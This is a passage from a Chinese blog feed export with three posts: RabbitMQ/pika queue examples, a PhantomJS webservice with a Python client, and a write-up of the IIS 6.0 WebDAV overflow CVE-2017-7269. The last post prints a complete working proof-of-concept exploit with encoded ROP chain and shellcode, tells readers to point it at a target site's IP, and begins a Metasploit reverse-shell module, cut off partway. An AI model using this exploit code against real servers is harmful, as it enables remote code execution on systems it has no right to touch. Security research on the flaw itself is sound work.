out)在启动rabbitmq时报这个错，则需要更改/etc/hosts文件，因为造成这个错误的原因是找不到host，绑定一下即可。比如，在/etc/host文件添加：1127.0.0.1 nmask WARNING Mnesia is overloaded: {dump_log, write_threshold}字面理解这个错误是过载，异步写入太频繁，会导致rabbitmq本崩溃退出。解决方案主要有2种：修改rabbitmq配置文件、升级erlang版本。 修改rabbitmq配置文件在配置文件中添加：1&#123;mnesia, [&#123;dump_log_write_threshold, 50000&#125;,&#123;dc_dump_limit,40&#125;]&#125;, 最终效果如下：1234[&#123;mnesia, [&#123;dump_log_write_threshold, 50000&#125;,&#123;dc_dump_limit,40&#125;]&#125;, &#123;rabbit, [ 说明：但我尝试发现还是不能解决问题。 升级erlang实际测试发现升级erlang可以解决此类问题。 Client Usage接下来可以在两台不同的PC上，运行两段代码，一段用来向rabbitmq队列中发送消息，另一段用来获取消息。 rabbitmq for pythonpython中来用连接操作rabbitmq服务的库有pika、txAMQP、py-amqplib，celery等，这里主要介绍下pika。 Rabbitmq+pikapika是python中用来连接rabbitmq服务端的第三方库。pika文档：http://pika.readthedocs.io/en/latest/examples/blocking_consume.html 安装pika1pip install pika pika Usage先搭建一个rabbitmq服务器用来存储消息队列，然后利用pika来存放获取队列中的任务，pika分为生产者与消费者模式. 生产者代码1234567891011121314151617181920import pika'''生产者模式代码，向rabbitmq消息队列中存放消息（任务）'''credentials = pika.PlainCredentials("test", "test")connection = pika.BlockingConnection(pika.ConnectionParameters(host='172.16.1.2',virtual_host="/",credentials=credentials))connection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2')) #链接rabbitmq服务器,端口可以不写。channel = connection.channel()#声明消息队列，消息将在这个队列中进行传递。channel.queue_declare(queue='hello')#申明hello队列，如果该队列不存在，则自动创建。#发送消息到hello队列中，若队列不存在，则自动清除这些消息。channel.basic_publish(exchange='', routing_key='hello', body='Hello World!')#exchange表示交换器，能精确指定消息应该发送到哪个队列,routing_key设置为队列的名称，body就是消息内容。print " [x] Sent 'Hello World!'"connection.close() #关闭连接'''rabbitmq服务器可以用rabbitmqctl list_queues来查看队列情况''' 消费者代码1234567891011121314151617181920import pika'''消费者模式代码，从rabbitmq消息队列中取出消息（任务）'''credentials = pika.PlainCredentials("test", "test")connection = pika.BlockingConnection(pika.ConnectionParameters(host='172.16.1.2',virtual_host="/",credentials=credentials)) #链接rabbitmq服务器,端口可以不写。channel = connection.channel()#声明消息队列，消息将在这个队列中进行传递。channel.queue_declare(queue='hello')#定义回调函数来处理接受到的消息def callback(ch, method, properties, body): print " [x] Received %r" % (body,)#告诉rabbitmq使用callback来接受消息channel.basic_consume(callback, queue='hello', no_ack=True)print ' [*] Waiting for messages. To exit press CTRL+C'#开始接受消息，并进入阻塞状态，队列里有消息才会调用callback进行处理，按ctrl+c退出。channel.start_consuming() 以上两段代码为最简单的生产者与消费者，没有涉及到持久化存储以及消息返回等内容。 消息确认当一个正在执行的消费者中断了，则需要返回消息，告诉rabbitmq重新将其分配给其他消费者。12345def callback(ch, method, properties, body): print " [x] Received %r" % (body,) time.sleep(5) print " [x] Done" ch.basic_ack(delivery_tag = method.delivery_tag) 然后修改no_ack为False1channel.basic_consume(callback, queue='hello', no_ack=False) 如果消息不确认，rabbitmq默认是没有超时时间的概念，即只要客户端连接不中断就会一直等待ack确认消息，那么此任务将会阻塞。针对这种情况，我们可以在程序中手动确认消息，即利用上面的代码。但如果程序在运行过程中出错，我们必须将此任务重新放回队列重新取出执行，则要用到channel.basic_nack(delivery_tag = method.delivery_tag)方法，可以实现将任务重新放回队列。 消息持久化存储 虽然有了消息反馈机制，但是如果rabbitmq自身挂掉的话，那么任务还是会丢失。所以需要将任务持久化存储起来。12345678910channel.queue_declare(queue='hello', durable=True)但是这个程序会执行错误，因为hello这个队列已经存在，并且是非持久化的，rabbitmq不允许使用不同的参数来重新定义存在的队列。重新定义一个队列：channel.queue_declare(queue='task_queue', durable=True)在发送任务的时候，用delivery_mode=2来标记任务为持久化存储：channel.basic_publish(exchange='', routing_key="task_queue", body=message, properties=pika.BasicProperties( delivery_mode = 2, # make message persistent )) 公平调度 上面实例中，虽然每个工作者是依次分配到任务，但是每个任务不一定一样。可能有的任务比较重，执行时间比较久；有的任务比较轻，执行时间比较短。如果能公平调度就最好了，使用basic_qos设置prefetch_count=1，使得rabbitmq不会在同一时间给工作者分配多个任务，即只有工作者完成任务之后，才会再次接收到任务。1channel.basic_qos(prefetch_count=1) pika vs celery celery用来分配任务的，主要是做异步任务队列的。 pika+rabbitmq主要是用来消息的收发功能，并不带有任务分配功能。比如说我们有很多台机器需要去rabbitmq服务器消息队列中取任务，任务怎么分配，pika应该做不到。pika只能做到消息的发送，以及消息的获取。又或者说pika其实就是用来使用rabbitmq的一个客户端，本身只是消息存储功能，并没有任务的分配等。如果需要此功能，就需要理由pika模块自己写一个调度方案，相当于自己写一个celery模块。 Rabbitmq任务调度问题首先，Rabbitmq任务调度应该是阻塞的，看代码：1234567891011121314151617181920212223import pikaimport time'''消费者模式代码，从rabbitmq消息队列中取出消息（任务）'''connection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2')) #链接rabbitmq服务器,端口可以不写。channel = connection.channel()#声明消息队列，消息将在这个队列中进行传递。channel.queue_declare(queue='hello')#定义回调函数来处理接受到的消息def callback(ch, method, properties, body): print " [x] Received %r" % (body,) time.sleep(1) #ch.basic_ack(delivery_tag = method.delivery_tag) ##消息确认，告诉队列这个任务做完了#告诉rabbitmq使用callback来接受消息channel.basic_qos(prefetch_count=10) #最多只会让消费者同时做10个任务channel.basic_consume(callback, queue='hello')print ' [*] Waiting for messages. To exit press CTRL+C'#开始接受消息，并进入阻塞状态，队列里有消息才会调用callback进行处理，按ctrl+c退出。channel.start_consuming() 运行结果：每隔1s输出一个hello world，输出10个后停止。 我们把ch.basic_ack(delivery_tag = method.delivery_tag)注释去掉，再运行. 每隔1s输出一个hello world ，不会停止。可以看到的是prefetch_count=10，也就是说可以同时执行10个任务，然而结果是并没有并发执行，而是单线程执行的，也就是说是一个任务一个任务执行的。 ch.basic_ack(delivery_tag = method.delivery_tag)的作用在于告诉队列，单个任务已经执行完，也就是说如果不回复，那么队列认为此任务还没做完，累计到10个任务后，达到了同时执行的最大任务量，因此便不会再下派任务。 那么加上消息确认，为何也没有达到10个任务并发执行呢？ 我的猜想是，rabbitmq本身并不是异步的（是阻塞的），也没有并发的功能，想要实现并发，需要自己写程序解决。修改代码，我们再看看.12345678910111213141516171819202122232425262728import pikaimport timeimport threading'''消费者模式代码，从rabbitmq消息队列中取出消息（任务）'''connection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2')) #链接rabbitmq服务器,端口可以不写。channel = connection.channel()#声明消息队列，消息将在这个队列中进行传递。channel.queue_declare(queue='hello')def test(ch,method,body): print " [x] Received %r" % (body,) time.sleep(1) ch.basic_ack(delivery_tag = method.delivery_tag) ##消息确认，告诉队列这个任务做完了#定义回调函数来处理接受到的消息def callback(ch, method, properties, body): t=threading.Thread(target=test,args=(ch,method,body)) #多线程 t.start()#告诉rabbitmq使用callback来接受消息channel.basic_qos(prefetch_count=2) #最多只会让消费者同时做10个任务channel.basic_consume(callback, queue='hello')print ' [*] Waiting for messages. To exit press CTRL+C'#开始接受消息，并进入阻塞状态，队列里有消息才会调用callback进行处理，按ctrl+c退出。channel.start_consuming() 运行结果：每隔1s，并发输出2个hello world，确实达到了并发的效果，然后并发的数量取决于prefetch_count=2的设置。 那么我们可以得出结论，从rabbitmq队列取出数据本身是阻塞的，没有达到并发，但是通过设置prefetch_count=2以及编写多线程函数，还是可以达到并发的效果。（prefetch_count 不设置，默认应该是没有上限） Rabbitmq并发调度问题Rabbitmq取任务本身不是并发的，但可以结合多线程、协程、多进程达到并发的效果。 @更新于2017年5月9日：以下并发方式并不适用于pika，因为其在一个blocking_connection中不支持并发，这里当做错误示范保留。如果需要并发，可以把多线程写在每个连接外面，即每个线程都去连接队列，达到并发收取队列任务的效果。 多线程代码：12345678910111213141516171819import pikaimport timeimport threadingconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2'))channel = connection.channel()channel.queue_declare(queue='hello')def test(ch,method,body): print " [x] Received %r" % (body,) time.sleep(1) ch.basic_ack(delivery_tag = method.delivery_tag)def callback(ch, method, properties, body): t=threading.Thread(target=test,args=(ch,method,body)) t.start()channel.basic_qos(prefetch_count=2)channel.basic_consume(callback, queue='hello')channel.start_consuming() 代码中定义的回调函数是一个多线程启动器，任务发给回调函数，回调函数会将它以多线程的形式传递给test函数，执行输出。并发的数量取决于prefetch_count=2，这代表同时执行任务的最大数量。 协程代码：1234567891011121314151617181920import pikaimport timeimport geventfrom gevent import monkey;monkey.patch_all()connection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2'))channel = connection.channel()channel.queue_declare(queue='hello')def test(ch,method,body): print " [x] Received %r" % (body,) time.sleep(1) ch.basic_ack(delivery_tag = method.delivery_tag)def callback(ch, method, properties, body): gevent.spawn(test,ch,method,body) #协程启动，没有调用join，因为rabbitmq本身是阻塞的,可以不用joinchannel.basic_qos(prefetch_count=2) #并发的数量channel.basic_consume(callback, queue='hello')channel.start_consuming() 多进程代码：（只能在linux下使用）1234567891011121314151617181920import pikaimport timefrom multiprocessing import Processconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2'))channel = connection.channel()channel.queue_declare(queue='hello')def test(ch,method,body): print " [x] Received %r" % (body,) time.sleep(1) ch.basic_ack(delivery_tag = method.delivery_tag)def callback(ch, method, properties, body): t=Process(target=test,args=(ch,method,body)) t.start()channel.basic_qos(prefetch_count=2) #并发的进程数量channel.basic_consume(callback, queue='hello')channel.start_consuming() 本文所写内容，均为本人测试后所得，如有错误，欢迎指正，谢谢！]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>RabbitMQ</tag>
        <tag>pika</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【phantomjs系列】Phantomjs正确打开方式]]></title>
    <url>../../../../../../../../2017/03/31/Phantomjs正确打开方式/</url>
    <content type="text"><![CDATA[你是如何走出人生的阴霾的？多走几步 前段时间分析了Selenium+Phantomjs的使用方法以及性能优化问题，期间也分析了利用Selenium+phantomjs爬虫爬过的一些坑问题。然而在使用phantomjs的过程中，并没有正真提升phantomjs的性能，爬虫性能也没有很好的提升。经过网友的提醒，发现其实是使用phantomjs的方法出了问题，因此无论怎么优化，都不能从根本上去提升性能。那么本篇就来好好说说，Phantomjs正确的打开方式。 抛弃selenium+phantomjs 之前我一直使用selenium去使用phantomjs，原因是因为selenium封装了phantomjs一部分功能，selenium又提供了python的接口模块，在python语言中可以很好地去使用selenium，间接地就可以使用phantomjs。然而，我现在要说的是，是时候抛弃selenium+phantomjs了，原因之一此封装的接口很久没有更新了（没人维护了），原因之二selenium只实现了一部分phantomjs功能，且很不完善。 phantomjs APi 通过查看phantomjs官方介绍，我们可以发现phantomjs的功能异常强大，绝不仅仅是selenium封装的功能那么简陋。phantomjs提供了很多种APi，具体可以查看：phantomjs api介绍，其中最常用的要属Phantomjs WebService与Phantomjs WebPage，前者用于开启http服务，后者用于发起http请求。 Phantomjs正确使用方式正确打开方式应该使用phantomjs Webservice作为一种web服务的形式（api）,将其与其他语言分离开来（比如python）。 设计流程： Python通过http请求下发任务，Phantomjs Webservice获取任务后去处理，处理完以后再将结果返回给Python。任务调度、存储等复杂操作交给Python去做，Python可以写成异步并发去请求Phantomjs Webservice，需要注意的是目前一个Phantomjs Webservice只支持10个并发。但我们可以在一台服务器上多开几个phantomjs Webservice启用不同的端口即可，或者可以多台服务器做个集群，用nginx做反向代理。 Phantomjs Webservice新建test.js，写入如下代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879//此js用来获取网页源码var system=require('system'); //get argsvar args=system.args;if (args.length ===2)&#123; var port=Number(args[1]);&#125;else&#123; var port=8080;&#125;var webserver = require('webserver');var server = webserver.create()var service = server.listen(port, function(request, response) &#123; try&#123; var postRaw=request.postRaw; var aaa=new Array(); aaa=postRaw.split("="); var url=aaa[0]; var md5_url=aaa[1]; url=decodeURIComponent(url); // 创建page var webPage = require('webpage'); var page = webPage.create(); page.settings.resourceTimeout = 20000;//timeout is 20s // 页面错误捕捉 page.onError = function(msg, trace) &#123; console.log("[Warning]This is page.onError"); var msgStack = ['ERROR: ' + msg]; if (trace &amp;&amp; trace.length) &#123; msgStack.push('TRACE:'); trace.forEach(function(t) &#123; msgStack.push(' -&gt; ' + t.file + ': ' + t.line + (t.function ? ' (in function "' + t.function +'")' : '')); &#125;); &#125; // console.error(msgStack.join('\n')); &#125;; // phantomjs错误捕捉 phantom.onError = function(msg, trace) &#123; console.log("[Warning]This is phantom.onError"); var msgStack = ['PHANTOM ERROR: ' + msg]; if (trace &amp;&amp; trace.length) &#123; msgStack.push('TRACE:'); trace.forEach(function(t) &#123; msgStack.push(' -&gt; ' + (t.file || t.sourceURL) + ': ' + t.line + (t.function ? ' (in function ' + t.function +')' : '')); &#125;); &#125; console.error(msgStack.join('\n')); phantom.exit(1); &#125;; // 打开网页，获取源码 page.open(url, function (status) &#123; console.log('Target_url is ' + url); //输出待检测的网站url if(status=='success')&#123; var current_url = page.url; var body= page.content; &#125; else &#123; var body=""; var current_url=""; &#125; response.status=200; // response.write(body); //返回获取到的网页源码 response.write(current_url); //返回当前的网页url page.close(); response.close(); &#125;); &#125; catch(e) &#123; console.log('[Error]'+e.message+'happen'+e.lineNumber+'line'); &#125;&#125;); 作用：处理http请求，获取url，进行截图或者获取源码操作。使用：1phantomjs.exe test.js 8080 会在本地开启web服务，端口为8080。 Python Client新建http_request.py，写入如下代码：123456789101112131415161718192021222324252627282930313233343536373839404142#! -*- coding:utf-8 -*-import requestsimport hashlibimport base64from multiprocessing.dummy import Poolclass http_request: def __init__(self,port="8080"): self.url="http://localhost:"+port def getwebbody(self,domain): ''' 获取网页源代码 ''' base_domain=base64.b64encode(domain) md5_domain=hashlib.md5(base_domain).hexdigest() payload=&#123;domain:md5_domain&#125; try: response=requests.post(self.url,data=payload,timeout=30).content return response except requests.exceptions.ConnectionError: print "requests connection error" except Exception,e: print e returnif __name__=="__main__": port="8080" cur=http_request(port) domain_list=["http://thief.one"]*10 def test(domain): print "Result_url is ",cur.getwebbody(domain) pool = Pool(processes=10) for domain in domain_list: #并发下发任务 pool.apply_async(test, args=(domain,)) #维持执行的进程总数为10，当一个进程执行完后添加新进程. pool.close() pool.join() 作用：异步并发下发任务。 运行截图运行python以后，异步下发10个任务，Phantomjs服务器端接收到url并开始处理，并发处理10个任务并输入结果。 异常处理现象：截图为黑屏原因：网页还没加载完，就开始截图了解决：在代码中open以后判断status值，判断网页是否加载完毕。 现象：程序出错–windows报错解决：更换最新版本的phantomjs 现象：内存占用过大，导致报错停止phantomjs进程原因：phantomjs没有释放内容解决：代码中open以后，要open.close(); 现象：没有截图成功原因：用了page.close，因为onloadfinished是非阻塞的，因此要将page.close放在open代码层内部。 转载请说明出处:Phantomjs正确打开方式 | nMask’Blog本文地址：http://thief.one/2017/03/31/Phantomjs正确打开方式/ 传送门 【phantomjs系列】phantomjs正确打开方式【phantomjs系列】phantomjs api介绍【phantomjs系列】selenium+phantomjs爬过的那些坑【phantomjs系列】selenium+phantomjs性能优化]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>Phantomjs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IIS6.0远程命令执行漏洞(CVE-2017-7269)]]></title>
    <url>../../../../../../../../2017/03/29/IIS6-0远程命令执行漏洞-CVE-2017-7269/</url>
    <content type="text"><![CDATA[天赋决定了你能达到的上限，努力程度决定了你能达到的下限以绝大多数人的努力程度之低，远远没有达到要去拼天赋的地步本文用于记录IIS6.0 WebDav 远程命令执行漏洞的相关信息，检测利用方法以及修复方案，内容大多来自互联网，在此记录备忘。免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负 漏洞信息漏洞编号：CVE-2017-7269发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院）漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。漏洞类型：缓冲区溢出漏洞等级：高危影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证，其他版本尚未验证）触发函数：ScStoragePathFromUrl函数附加信息：ScStoragePathFromUrl函数被调用了两次漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞，攻击者通过一个以“If: &lt;Http://”开始的较长header头的PROPFIND请求执行任意代码。 利用条件 iis6.0 开启WebDav功能（具体为PROPFIND方法，成功则返回207或者200） windows server 2003 R2 Poc1234567891011121314151617181920#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.#written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China #-----------Email: edwardz@foxmail.comimport socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(('127.0.0.1',80)) pay='PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'pay+='If: &lt;http://localhost/aaaaaaa'pay+='\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'pay+='&gt;'pay+=' (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb'pay+='\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'shellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'pay+=shellcodepay+='&gt;\r\n\r\n'print paysock.send(pay) data = sock.recv(80960) print data sock.close poc来自：https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py 修改代码sock.connect((‘127.0.0.1’,80))，将其中ip地址改为目标网站ip，运行该py文件，会在目标服务器上产生一个calc进程（计算器）。 Exp以上poc只是用来验证此漏洞是否存在，但需要登录的服务器上查看进程才能确定。经过国外大牛的加工，编写了一个利用msf反弹shell的ruby脚本。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475require 'msf/core'class MetasploitModule &lt; Msf::Exploit::Remote Rank = GoodRanking include Msf::Exploit::Remote::Tcp def initialize(info = &#123;&#125;) super(update_info(info, 'Name' =&gt; 'CVE-2017-7269 Microsoft IIS WebDav ScStoragePathFromUrl Overflow', 'Description' =&gt; %q&#123; Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with "If: &lt;http://" in a PROPFIND request, as exploited in the wild in July or August 2016. Original exploit by Zhiniang Peng and Chen Wu. &#125;, 'Author' =&gt; [ 'Dominic Chell &lt;dominic@mdsec.co.uk&gt;' ], 'License' =&gt; MSF_LICENSE, 'References' =&gt; [ [ 'CVE', 'CVE-2017-7269'], [ 'BID', '97127'], [ 'URL', 'https://github.com/edwardz246003/IIS_exploit'], ], 'Privileged' =&gt; false, 'Payload' =&gt; &#123; 'Space' =&gt; 2000, 'BadChars' =&gt; "\x00", 'EncoderType' =&gt; Msf::Encoder::Type::AlphanumUnicodeMixed, 'DisableNops' =&gt; 'True', 'EncoderOptions' =&gt; &#123; 'BufferRegister' =&gt; 'ESI', &#125; &#125;, 'DefaultOptions' =&gt; &#123; 'EXITFUNC' =&gt; 'process', 'PrependMigrate' =&gt; true, 'PrependMigrateProc' =&gt; "calc" &#125;, 'Targets' =&gt; [ [ 'Microsoft Windows Server 2003 R2', &#123; 'Platform' =&gt; 'win', &#125;, ], ], 'Platform' =&gt; 'win', 'DisclosureDate' =&gt; 'March 26 2017', 'DefaultTarget' =&gt; 0)) register_options( [ Opt::RPORT(80) ], self.class) end def exploit connect buf1 = "If: &lt;http://localhost/aaaaaaa" buf1 &lt;&lt; "\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x8